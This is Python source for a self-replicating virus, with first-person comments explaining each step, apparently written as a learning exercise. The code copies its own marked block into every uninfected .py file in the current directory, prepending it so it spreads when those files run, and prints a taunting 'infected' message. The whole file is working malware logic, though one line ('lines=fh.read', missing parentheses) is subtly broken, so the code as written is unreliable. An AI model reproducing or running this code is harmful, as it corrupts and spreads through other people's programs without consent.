import sys, glob,re

###VIRUS BEGIN###
#Get a copy of the virus

##This is the virus list
vCode= []
##Need to open a copy myself and because this program is running 
##It should be argv as number 0 and open it as read-only
fh = open(sys.argv[0],"r")
##I'm going to get all the lines, read all the lines in there
lines=fh.read
##Close my file
fh.close()

#Keeping track if I'm in the virus or not
inVirus= False

#We read the lines one at a time in the file (fh.read)
for line in lines:
#check to see if that line is the beginning of the virus or not
##So if it is the beginning of the virus, maybe research for that line. Its going to look for my VIRUS begin line.
##If the line matches, then I want to mark myself as being in the Virus
    if(re.search('^###VIRUS BEGIN###',line)): inVirus=True
    #If I am in the virus, in that line, then I want to save a copy of that line in my list of virus vCode
    if(inVirus) : vCode.append(line)
    #and what if you are not in the virus or if I am at the end of the virus and want to leave the virus
    #and  I want to get the last line VIRUS end. I am done with my virus and I can break out
    if(re.search('^###VIRUS END###',line)): break

#Find potential victims
# victims are python files
progs=glob.glob("*.py")

#Check and Infect
#Now I want to look at my potential victims and figure out if I need to infect them 
for prog in progs:

    ##open the program and read only
    fh= open(prog,"r")
    
    ##get all the lines
    pCode=fh.readlines()
    
    ##file is closed
    fh.close()
    
    #check to see if I am infected, because I could be opening myself, I could by opening some other program thats infected
    #So the assumption is that the file is not infected 
    infected=False
    
    #unless I find a line that indicates that is affected, infected is then true and it will break out of this loop, 
    ##but it wont break out of the other loop for prog in progs, so I will still be looking at programs
    for line in pCode:
        if('###VIRUS BEGIN###' in line):
            infected=True
            break
        
    #So if I'm still not infected, then I want to infect the system
    if not infected:
    #newCode is a collection of my original program code plus my virus code
        newCode=[]
    #if something starts with a hash, then we want to take this line so we can spread it into other enviroments better
    # so this would be appended to the newcode and its going to pop of in front of the list
        if('#!' in pCode[0]): newCode.append(pCode.pop(0))
    #load the virus code in
    
    #New copy of the virus written
        newCode.extend(vCode)
        newCode.extend(pCode)
    
   
    #Now we are going to write the file out and the file only needs to be written if its infected
    #Writing new virus infected code
    ##open the file for writing and its once again in prog
        fh=open(prog,'w')
    ##now I want to write all of the lines and all of the lines are in this newcode thing
        fh.writelines(newCode)
        fh.close()
        
        
    
        
        
        
        
#Optionel Payload
print("YOU ARE INFECTED LOSER")

###VIRUS END###

